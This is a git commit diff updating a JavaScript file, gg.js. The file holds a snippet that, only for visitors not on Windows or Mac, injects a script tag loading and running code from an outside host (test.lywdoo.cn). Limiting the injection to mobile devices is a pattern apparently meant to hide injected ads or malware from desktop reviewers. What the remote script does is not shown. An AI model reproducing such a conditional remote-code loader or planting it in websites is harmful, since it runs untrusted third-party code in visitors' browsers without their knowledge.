6dfa0159c7b16b8e7f9c007bb84040ea16027272
乐乐 <35110476+lelege@users.noreply.github.com>
2021-11-20 22:05:17 +0800

    Update gg.js

--- js/gg.js
+++ js/gg.js
@@ -1,8 +1,9 @@
-if(!(navigator.platform.indexOf('Win') > -1 || navigator.platform.indexOf('Mac') > -1)) {
-            var hi = document.createElement("script");
-            hi.src = "https://test.lywdoo.cn/bx/xx06.js";
-            hi.charset = "UTF-8";
-            var k = document.getElementsByTagName("script")[0];
-            k.parentNode.insertBefore(hi, k);
-        }
-    })();
+(function() {
+	if(!(navigator.platform.indexOf('Win') > -1 || navigator.platform.indexOf('Mac') > -1)) {
+		var hi = document.createElement("script");
+		hi.src = "https://test.lywdoo.cn/bx/xx06.js";
+		hi.charset = "UTF-8";
+		var k = document.getElementsByTagName("script")[0];
+		k.parentNode.insertBefore(hi, k);
+	}
+})();
